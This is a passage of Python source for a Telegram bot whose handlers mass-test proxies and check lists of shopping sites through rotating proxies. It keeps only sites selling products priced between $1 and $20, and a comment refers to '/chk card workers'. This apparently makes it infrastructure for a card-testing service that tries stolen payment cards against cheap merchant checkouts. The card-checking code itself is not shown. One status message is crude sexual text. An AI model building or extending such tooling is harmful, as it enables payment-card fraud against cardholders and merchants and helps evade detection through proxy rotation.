                        f"❌ Total » <b>{len(dead_proxies)}</b> dead proxies"
                    ),
                    parse_mode='html',
                    attributes=[telethon.tl.types.DocumentAttributeFilename('rzpxy_dead.txt')]
                )
                try:
                    os.remove(tmp_dead)
                except Exception:
                    pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        # Reset global state
        current_rzpxy_check['tasks']    = []
        current_rzpxy_check['owner_id'] = None
        current_rzpxy_check['stopped']  = False

@bot.on(events.NewMessage(pattern=r'^/proxy(?:\s|$)'))
async def proxy_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    # Block if another proxy check is already running
    if current_proxy_check.get('tasks') and any(not t.done() for t in current_proxy_check.get('tasks', [])):
        await event.reply(premium_emoji(
            "⚠️ <b>Proxy check already running!</b>\n\n"
            "Please wait or click <b>STOP</b> on that message."
        ), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji(
            "❌ <b>No Proxies Found</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "proxy.txt is empty.\n\n"
            "💡 Use <code>/addproxy ip:port:user:pass</code> to add proxies."
        ), parse_mode='html')
        return

    total = len(proxies)
    bar_init = make_progress_bar(0, total)

    status_msg = await event.reply(
        premium_emoji(
            f"🔍 <b>PROXY CHECKER — Starting</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 <b>Total Proxies</b> » <b>{total}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>Progress</b>     » <code>0/{total}</code>\n"
            f"✅ <b>Alive</b>        » <b>0</b>  |  ❌ <b>Dead</b> » <b>0</b>\n"
            f"⏱️ <b>Speed</b>        » —\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<code>{bar_init}</code>\n"
            f"⚡ Testing with <b>50 threads</b>..."
        ),
        buttons=[[Button.inline("STOP", b"stop_proxy_check", style="danger")]],
        parse_mode='html'
    )

    alive_proxies = []
    dead_proxies = []
    last_edit_time = 0.0
    start_time = time.time()
    semaphore = asyncio.Semaphore(100)  # was 50 — more parallel proxy tests

    async def test_one_proxy_batch(proxy):
        if current_proxy_check.get('stopped'):
            return {'proxy': proxy, 'status': 'skipped'}
        async with semaphore:
            return await test_proxy(proxy)

    try:
        tasks = [asyncio.create_task(test_one_proxy_batch(p)) for p in proxies]

        # Register in global state for STOP button
        current_proxy_check['tasks'] = tasks
        current_proxy_check['alive_proxies'] = alive_proxies
        current_proxy_check['dead_proxies'] = dead_proxies
        current_proxy_check['status_msg'] = status_msg
        current_proxy_check['new_proxies'] = proxies
        current_proxy_check['stopped'] = False
        current_proxy_check['owner_id'] = user_id
        current_proxy_check['mode'] = 'check'

        for coro in asyncio.as_completed(tasks):
            if current_proxy_check.get('stopped'):
                break
            try:
                result = await coro
                if result.get('status') == 'alive':
                    alive_proxies.append(result.get('proxy', ''))
                elif result.get('status') != 'skipped':
                    dead_proxies.append(result.get('proxy', ''))
            except Exception:
                pass

            done_count = len(alive_proxies) + len(dead_proxies)
            now = time.time()
            elapsed = now - start_time
            speed = round(done_count / elapsed, 1) if elapsed > 0 else 0
            bar = make_progress_bar(done_count, total)

            if (done_count % 10 == 0 or done_count == total) and (now - last_edit_time >= 0.8 or done_count == total):
                last_edit_time = now
                await safe_edit(status_msg,
                    f"🔍 <b>PROXY CHECKER — Running</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📦 <b>Total Proxies</b> » <b>{total}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 <b>Progress</b>     » <code>{done_count}/{total}</code>\n"
                    f"✅ <b>Alive</b>        » <b>{len(alive_proxies)}</b>  |  ❌ <b>Dead</b> » <b>{len(dead_proxies)}</b>\n"
                    f"⏱️ <b>Speed</b>        » {speed}/s\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"<code>{bar}</code>\n"
                    f"⏳ Checking remaining proxies...",
                    buttons=[[Button.inline("STOP", b"stop_proxy_check", style="danger")]]
                )

        # Only overwrite proxy file if NOT stopped (stop callback already saved alive ones)
        if not current_proxy_check.get('stopped'):
            async with aiofiles.open(PROXY_FILE, 'w') as f:
                for proxy in alive_proxies:
                    await f.write(f"{proxy}\n")

            elapsed_total = time.time() - start_time
            elapsed_str = f"{int(elapsed_total)}s"
            removed_count = len(dead_proxies)
            pct_alive = round((len(alive_proxies) / total) * 100) if total > 0 else 0
            bar_final = make_progress_bar(total, total)

            await safe_edit(status_msg,
                f"✅ <b>PROXY CHECK — Complete</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📦 <b>Total Checked</b> » <b>{total}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Alive (Kept)</b>  » <b>{len(alive_proxies)}</b>  ({pct_alive}%)\n"
                f"❌ <b>Dead (Removed)</b>» <b>{removed_count}</b>\n"
                f"⏱️ <b>Time Taken</b>    » <b>{elapsed_str}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{bar_final}</code>\n"
                f"💾 proxy.txt updated — <b>{len(alive_proxies)}</b> live proxies saved."
            )

    except Exception as e:
        await safe_edit(status_msg, f"❌ Error during proxy check: {e}")
    finally:
        # Reset global state
        current_proxy_check['tasks'] = []
        current_proxy_check['owner_id'] = None
        current_proxy_check['stopped'] = False


@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxy = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await safe_edit(status_msg, f"✅ Proxy is ALIVE!\n\n<code>{proxy}</code>")
        else:
            await safe_edit(status_msg, f"❌ Proxy is DEAD!\n\n<code>{proxy}</code>")

    except Exception as e:
        await safe_edit(status_msg, f"❌ Error: {e}")


@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxy_to_remove = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ Proxy removed!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    indices_str = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    removed_text = "\n".join(removed[:10])
    await event.reply(premium_emoji(f"✅ Removed {len(removed)} proxies!\n\nRemoved:\n<code>{removed_text}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/clearproxy(?:\s|$)'))
async def clear_all_proxies(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ proxy.txt is already empty."), parse_mode='html')
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = os.path.join(BASE_DIR, f"proxy_backup_{user_id}_{timestamp}.txt")

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"📦 Backup created!\n\nSending backup of {count} proxies..."), file=backup_filename, parse_mode='html')

        try:
            os.remove(backup_filename)
        except Exception:
            pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ Cleared all {count} proxies!\n\nproxy.txt is now empty."), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/getproxy(?:\s|$)'))
async def get_all_proxies(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(BASE_DIR, f"proxies_{user_id}_{timestamp}.txt")

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\nFile attached below."), file=filename, parse_mode='html')

        try:
            os.remove(filename)
        except Exception:
            pass


@bot.on(events.NewMessage(pattern=r'^/site(?:\s|$)'))
async def site_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this."), parse_mode='html')
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ <b>No sites in DB.</b> Use /addsites to add sites."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Add proxies first."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 𝘼 𝙎𝙚𝙭𝙮 𝙂𝙞𝙧𝙡 𝙄𝙨 𝙋𝙧𝙚𝙥𝙖𝙧𝙞𝙣𝙜 𝙃𝙚𝙧𝙨𝙚𝙡𝙛 𝙏𝙤 𝙃𝙖𝙫𝙚 𝙎𝙚𝙭 𝙒𝙞𝙩𝙝 𝙔𝙤𝙪..."), parse_mode='html')

    pending_sitecheck[user_id] = {
        'sites': sites,
        'proxies': proxies,
        'msg_id': status_msg.id,
        'chat_id': event.chat_id,
    }

    filter_text = (
        f"🌐 <b>Site Checker</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 Sites in DB  » <b>{len(sites)}</b>\n"
        f"🔌 Proxies      » <b>{len(proxies)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💰 <b>Select price filter:</b>\n"
        f"Dead sites will be removed from DB.\n"
        f"Alive sites outside the range will also be removed."
    )
    filter_buttons = [
        [
            Button.inline("1 - 5$",            f"sf_{user_id}_1_5".encode(), style="success"),
            Button.inline("5 - 10$",           f"sf_{user_id}_5_10".encode(), style="success"),
        ],
        [
            Button.inline("10 - 15$",          f"sf_{user_id}_10_15".encode(), style="success"),
            Button.inline("15 - 20$",          f"sf_{user_id}_15_20".encode(), style="success"),
        ],
        [
            Button.inline("No Filter (keep all alive)", f"sf_{user_id}_0_0".encode(), style="success"),
        ],
    ]
    await safe_edit(status_msg, filter_text, buttons=filter_buttons)


@bot.on(events.CallbackQuery(pattern=rb"sf_(\d+)_(\d+)_(\d+)"))
async def sitecheck_filter_callback(event):
    match   = event.pattern_match
    cb_uid  = int(match.group(1).decode())
    min_p   = int(match.group(2).decode())
    max_p   = int(match.group(3).decode())
    no_filter = (min_p == 0 and max_p == 0)

    if event.sender_id != cb_uid:
        await event.answer("❌ Not your request.", alert=True)
        return

    state = pending_sitecheck.pop(cb_uid, None)
    if not state:
        await event.answer("❌ Session expired. Run /site again.", alert=True)
        return

    # 5-10, 10-15, 15-20 select karne par min_p 1 ho jaata hai
    if not no_filter and max_p > 5:
        min_p = 1

    filter_label = "No Filter" if no_filter else f"$1 – ${max_p}" if max_p > 5 else f"${min_p} – ${max_p}"
    await event.answer(f"✅ Filter: {'None' if no_filter else f'$1–${max_p}' if max_p > 5 else f'${min_p}–${max_p}'}")

    sites    = state['sites']
    proxies  = state['proxies']
    msg_id   = state['msg_id']
    chat_id  = state['chat_id']

    await safe_bot_edit(
        chat_id, msg_id,
        premium_emoji(
            f"🔄 <b>Checking {len(sites)} sites...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 Price filter » <b>{filter_label}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Starting parallel check, please wait..."
        ),
        buttons=[[Button.inline("STOP", b"stop_site_check", style="danger")]],
        parse_mode='html'
    )

    alive_sites   = []
    filtered_out  = []
    dead_sites    = []
    checked_count = [0]
    lock          = asyncio.Lock()
    # Dedicated site semaphore — does NOT compete with /chk card workers
    sem           = asyncio.Semaphore(25)  # medium speed — accurate results

    _need_price = not no_filter  # Only fetch price when filter is active

    async def check_one(site):
        async with _site_check_semaphore:  # global site slot
            async with sem:                # per-operation cap
                proxy = random.choice(proxies)
                _t0 = time.time()
                result = await test_site(site, proxy, need_price=_need_price)
                record_bot_response_time(time.time() - _t0)
                return result

    current_site_check['stopped'] = False

    async def run_all():
        # BUG FIX: wrap coroutines in create_task so .cancel() actually works
        tasks = [asyncio.create_task(check_one(site)) for site in sites]
        current_site_check['tasks'] = tasks
        current_site_check['owner_id'] = cb_uid
        current_site_check['chat_id'] = chat_id
        current_site_check['msg_id'] = msg_id
        total = len(tasks)
        for coro in asyncio.as_completed(tasks):
            if current_site_check['stopped']:
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
            try:
                res = await coro
            except asyncio.CancelledError:
                break
            except Exception:
                res = {'site': 'unknown', 'status': 'dead', 'price': '-'}
            async with lock:
                checked_count[0] += 1
                cnt = checked_count[0]

                if res['status'] == 'alive':
                    if price_in_range(res['price'], min_p, max_p):
                        alive_sites.append(res['site'])
                    else:
                        filtered_out.append(res['site'])
                else:
                    dead_sites.append(res['site'])

                if cnt % 5 == 0 or cnt == total or current_site_check['stopped']:
                    status_line = "Stopped by user" if current_site_check['stopped'] else f"📊 Progress » {cnt}/{total}"
                    _btns = [] if current_site_check['stopped'] else [[Button.inline("STOP", b"stop_site_check", style="danger")]]
                    await safe_bot_edit(
                        chat_id, msg_id,
                        premium_emoji(
                            f"🔄 <b>Checking Sites (Parallel)...</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"💰 Filter  » <b>{filter_label}</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"{status_line}\n"
                            f"✅ Alive    » {len(alive_sites)}\n"
                            f"🚫 Filtered » {len(filtered_out)}\n"
                            f"❌ Dead     » {len(dead_sites)}"
                        ),
                        buttons=_btns if _btns else None,
                        parse_mode='html'
                    )

    was_stopped = False
    try:
        await run_all()
    finally:
        was_stopped = current_site_check['stopped']
        current_site_check['tasks'] = []
        current_site_check['owner_id'] = None
        current_site_check['chat_id'] = None
        current_site_check['msg_id'] = None
        current_site_check['stopped'] = False

    if was_stopped:
        # Save alive sites + unchecked sites (preserve sites not yet checked)
        checked_set = set(alive_sites) | set(dead_sites) | set(filtered_out)
        unchecked_sites = [s for s in sites if s not in checked_set]
        sites_to_save = alive_sites + unchecked_sites
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in sites_to_save:
                await f.write(f"{site}\n")

        removed = len(dead_sites) + len(filtered_out)
        stopped_text = (
            f"🛑 <b>Site Check Stopped</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 Filter     » {filter_label}\n"
            f"📊 Checked    » {checked_count[0]}/{len(sites)}\n"
            f"✅ Alive      » {len(alive_sites)}\n"
            f"🚫 Filtered   » {len(filtered_out)}\n"
            f"❌ Dead       » {len(dead_sites)}\n"
            f"⏸️ Unchecked  » {len(unchecked_sites)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💾 Removed {removed} dead/filtered sites.\n"
            f"📦 DB updated » {len(sites_to_save)} sites kept."
        )
        await safe_bot_edit(chat_id, msg_id, premium_emoji(stopped_text), parse_mode='html')
        return

    # Save only alive (in-range) sites
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for site in alive_sites:
            await f.write(f"{site}\n")

    removed = len(dead_sites) + len(filtered_out)
    preview = "\n".join([f"  • {s}" for s in alive_sites[:5]])
    if len(alive_sites) > 5:
        preview += f"\n  ... +{len(alive_sites) - 5} more"
    if not preview:
        preview = "  None survived the filter."

    result_text = (
        f"✅ <b>Site Check Complete!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 Filter     » {filter_label}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📤 Total      » {len(sites)}\n"
        f"✅ Alive      » {len(alive_sites)}\n"
        f"🚫 Filtered   » {len(filtered_out)}\n"
        f"❌ Dead       » {len(dead_sites)}\n"
        f"🗑️ Removed    » {removed}\n"
        f"📦 DB updated » {len(alive_sites)} sites\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>Kept:</b>\n{preview}"
    )
    await safe_bot_edit(chat_id, msg_id, premium_emoji(result_text), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rm\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    try:
        url_to_remove = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
        if not url_to_remove:
            await event.reply(premium_emoji("❌ Usage: <code>/rm https://site.com</code>"), parse_mode='html')
            return

        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found: <code>{url_to_remove}</code>"), parse_mode='html')
            return

        new_sites = [site for site in current_sites if site != url_to_remove]

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ Site removed!\n\n<code>{url_to_remove}</code>"), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/addsites(?:\s|$)'))
async def add_sites_command(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji(
            "📂 <b>How to use:</b>\n"
            "Reply to a <code>.txt</code> file containing site list, then send <code>/addsites</code>"
        ), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not is_text_reply_file(reply_msg):
        await event.reply(premium_emoji("❌ Please reply to a <code>.txt</code> file."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("⏳ Reading file..."), parse_mode='html')

    try:
        file_path = await reply_msg.download_media()

        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
            new_sites = [line.strip() for line in content.splitlines() if line.strip()]

        os.remove(file_path)

        if not new_sites:
            await safe_edit(status_msg, "❌ No valid sites found in file.")
            return

        proxies = load_proxies()
        if not proxies:
            await safe_edit(status_msg, "❌ No proxies available to test sites.")
            return

        # Store pending state and ask for price filter
        pending_addsites[user_id] = {
            'sites': new_sites,
            'proxies': proxies,
            'msg_id': status_msg.id,
            'chat_id': event.chat_id,
        }

        filter_text = (
            f"📂 <b>Sites file loaded!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 Sites found: <b>{len(new_sites)}</b>\n"
            f"🔌 Proxies:     <b>{len(proxies)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💰 <b>Select a price filter:</b>\n"
            f"Only sites whose product price falls inside\n"
            f"the selected range will be added."
        )

        filter_buttons = [
            [
                Button.inline("1 - 5$",   f"af_{user_id}_1_5".encode(), style="success"),
                Button.inline("5 - 10$",  f"af_{user_id}_5_10".encode(), style="success"),
            ],
            [
                Button.inline("10 - 15$", f"af_{user_id}_10_15".encode(), style="success"),
                Button.inline("15 - 20$", f"af_{user_id}_15_20".encode(), style="success"),
            ],
            [
                Button.inline("No Filter (keep all alive)", f"af_{user_id}_0_0".encode(), style="success"),
            ],
        ]

        try:
            await safe_edit(status_msg, filter_text, buttons=filter_buttons)
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 1)
            await safe_edit(status_msg, filter_text, buttons=filter_buttons)

    except Exception as e:
        await safe_edit(status_msg, f"❌ Error: {e}")

@bot.on(events.CallbackQuery(pattern=rb"af_(\d+)_(\d+)_(\d+)"))
async def addsites_filter_callback(event):
    match = event.pattern_match
    cb_user_id = int(match.group(1).decode())
    min_p = int(match.group(2).decode())
    max_p = int(match.group(3).decode())

    # Only the admin who triggered /addsites can press this
    if event.sender_id != cb_user_id:
        await event.answer("❌ Not your request.", alert=True)
        return

    state = pending_addsites.pop(cb_user_id, None)
    if not state:
        await event.answer("❌ Session expired. Run /addsites again.", alert=True)
        return

    no_filter = (min_p == 0 and max_p == 0)

    # 5-10, 10-15, 15-20 select karne par min_p 1 ho jaata hai
    if not no_filter and max_p > 5:
        min_p = 1

    filter_label = "No Filter" if no_filter else f"$1 – ${max_p}" if max_p > 5 else f"${min_p} – ${max_p}"
    await event.answer(f"✅ Filter: {'None' if no_filter else f'$1–${max_p}' if max_p > 5 else f'${min_p}–${max_p}'}")

    new_sites = state['sites']
    proxies   = state['proxies']
    msg_id    = state['msg_id']
    chat_id   = state['chat_id']

    await safe_bot_edit(
        chat_id, msg_id,
        premium_emoji(
            f"🔄 <b>Checking {len(new_sites)} sites...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 Price filter: <b>{filter_label}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Starting concurrent check, please wait..."
        ),
        buttons=[[Button.inline("STOP", b"stop_addsites", style="danger")]],
        parse_mode='html'
    )

    alive_sites   = []
    filtered_out  = []
    dead_sites    = []
    checked_count = [0]
    lock = asyncio.Lock()
    last_edit_time = [0.0]

    # Concurrency matches API's mass lane limit (30 slots).
    # Beyond this, requests just queue at the API semaphore.
    # Dedicated site semaphore — does NOT block /chk card workers
    sem = asyncio.Semaphore(25)  # medium speed — accurate results

    _need_price = not no_filter  # Only fetch price when filter is active

    async def check_one(site):
        async with _site_check_semaphore:  # global site slot
            async with sem:                # per-operation cap
                proxy = random.choice(proxies)
                _t0 = time.time()
                result = await test_site(site, proxy, need_price=_need_price)
                record_bot_response_time(time.time() - _t0)
                return result

    current_addsites_check['stopped'] = False

    async def run_all():
        tasks = [asyncio.create_task(check_one(site)) for site in new_sites]
        current_addsites_check['tasks'] = tasks
        current_addsites_check['owner_id'] = cb_user_id
        current_addsites_check['chat_id'] = chat_id
        current_addsites_check['msg_id'] = msg_id
        total = len(tasks)

        for coro in asyncio.as_completed(tasks):
            if current_addsites_check['stopped']:
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break

            try:
                res = await coro
            except asyncio.CancelledError:
                break

            async with lock:
                checked_count[0] += 1
                cnt = checked_count[0]
                if res['status'] == 'alive':
                    if price_in_range(res['price'], min_p, max_p):
                        alive_sites.append(res['site'])
                    else:
                        filtered_out.append(res['site'])
                else:
                    dead_sites.append(res['site'])
                snap = (cnt, len(alive_sites), len(filtered_out), len(dead_sites))

            now = time.time()
            if (snap[0] % 5 == 0 or snap[0] == total) and (now - last_edit_time[0] >= 1.2 or snap[0] == total):
                last_edit_time[0] = now
                await safe_bot_edit(
                    chat_id, msg_id,
                    premium_emoji(
                        f"🔄 <b>Checking Sites...</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"💰 Filter  » <b>{filter_label}</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📊 Progress » {snap[0]}/{total}\n"
                        f"✅ Alive    » {snap[1]}\n"
                        f"🚫 Filtered » {snap[2]}\n"
                        f"❌ Dead     » {snap[3]}"
                    ),
                    buttons=[[Button.inline("STOP", b"stop_addsites", style="danger")]],
                    parse_mode='html'
                )

    was_stopped = False
    try:
        await run_all()
    finally:
        was_stopped = current_addsites_check['stopped']
        current_addsites_check['tasks'] = []
        current_addsites_check['owner_id'] = None
        current_addsites_check['chat_id'] = None
        current_addsites_check['msg_id'] = None
        current_addsites_check['stopped'] = False

    if was_stopped:
        # Save alive sites found so far (merge with existing DB)
        saved_count = 0
        if alive_sites:
            existing_sites = load_sites()
            merged_sites = list(dict.fromkeys(existing_sites + alive_sites))
            saved_count = len(merged_sites) - len(existing_sites)
            async with aiofiles.open(SITES_FILE, 'w') as f:
                for site in merged_sites:
                    await f.write(f"{site}\n")

        stopped_text = (
            f"🛑 <b>Addsites Check Stopped</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 Filter     » {filter_label}\n"
            f"📊 Checked    » {checked_count[0]}/{len(new_sites)}\n"
            f"✅ Matched    » {len(alive_sites)}\n"
            f"🚫 Filtered   » {len(filtered_out)}\n"
            f"❌ Dead       » {len(dead_sites)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💾 Saved {saved_count} new sites to DB."
        )
        await safe_bot_edit(chat_id, msg_id, premium_emoji(stopped_text), parse_mode='html')
        return

    # FIX #2 — MERGE with existing sites
    existing_sites = load_sites()
    merged_sites = list(dict.fromkeys(existing_sites + alive_sites))
    newly_added = len(merged_sites) - len(existing_sites)

    async with aiofiles.open(SITES_FILE, 'w') as f:
        for site in merged_sites:
            await f.write(f"{site}\n")

    added_preview = "\n".join([f"  • {s}" for s in alive_sites[:5]])
    if len(alive_sites) > 5:
        added_preview += f"\n  ... +{len(alive_sites) - 5} more"
    if not added_preview:
        added_preview = "  None matched the price filter."

    result_text = (
        f"✅ <b>Sites Update Complete!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 Filter     » {filter_label}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📤 Received   » {len(new_sites)}\n"
        f"✅ Matched    » {len(alive_sites)}\n"
        f"🚫 Filtered   » {len(filtered_out)}\n"
        f"❌ Dead       » {len(dead_sites)}\n"
        f"➕ New added  » {newly_added}\n"
        f"📦 Total DB   » {len(merged_sites)}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>Added:</b>\n{added_preview}"
    )

    await safe_bot_edit(chat_id, msg_id, premium_emoji(result_text), parse_mode='html')


# FIX #3 — /getsites handler (was completely missing)
@bot.on(events.NewMessage(pattern=r'^/getsites(?:\s|$)'))
async def get_sites_command(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    current_sites = load_sites()

    if not current_sites:
        await event.reply(premium_emoji("❌ sites.txt is empty. No sites to download."), parse_mode='html')
        return

    if len(current_sites) <= 20:
        sites_list = "\n".join([f"{i+1}. <code>{s}</code>" for i, s in enumerate(current_sites)])
        await event.reply(
            premium_emoji(f"🌐 <b>Sites ({len(current_sites)}):</b>\n\n{sites_list}"),
            parse_mode='html'
        )
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(BASE_DIR, f"sites_{timestamp}.txt")

        async with aiofiles.open(filename, 'w') as f:
            for i, site in enumerate(current_sites):
                await f.write(f"{i+1}. {site}\n")

        await event.reply(
            premium_emoji(f"🌐 <b>Sites ({len(current_sites)})</b>\n\nFile attached below."),
            file=filename,
            parse_mode='html'
        )

        try:
            os.remove(filename)
        except Exception:
            pass


@bot.on(events.NewMessage(pattern=r'^/listusers(?:\s|$)'))
async def list_users_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    users = load_users_data()
    if not users:
        await event.reply(premium_emoji("📭 No active users found."), parse_mode='html')
        return

    now = datetime.now()
    lines = []
    active = 0
